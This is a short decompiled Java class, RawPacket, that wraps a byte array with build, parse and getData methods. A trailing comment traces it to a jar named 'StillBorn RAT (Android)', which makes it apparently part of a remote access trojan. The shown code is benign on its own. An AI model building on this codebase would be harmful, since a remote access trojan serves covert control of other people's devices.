/*  1:   */ package Packet;
/*  2:   */ 
/*  3:   */ public class RawPacket
/*  4:   */   implements Packet
/*  5:   */ {
/*  6:   */   private byte[] data;
/*  7:   */   
/*  8:   */   public RawPacket() {}
/*  9:   */   
/* 10:   */   public RawPacket(byte[] data)
/* 11:   */   {
/* 12:31 */     this.data = data;
/* 13:   */   }
/* 14:   */   
/* 15:   */   public byte[] build()
/* 16:   */   {
/* 17:35 */     return this.data;
/* 18:   */   }
/* 19:   */   
/* 20:   */   public void parse(byte[] packet)
/* 21:   */   {
/* 22:39 */     this.data = packet;
/* 23:   */   }
/* 24:   */   
/* 25:   */   public byte[] getData()
/* 26:   */   {
/* 27:43 */     return this.data;
/* 28:   */   }
/* 29:   */ }


/* Location:           C:\Users\SmileyFacedHacker\Downloads\StillBorn RAT (Android)\StillBorn RAT (Android)\StillBornRAT.jar
 * Qualified Name:     Packet.RawPacket
 * JD-Core Version:    0.7.0.1
 */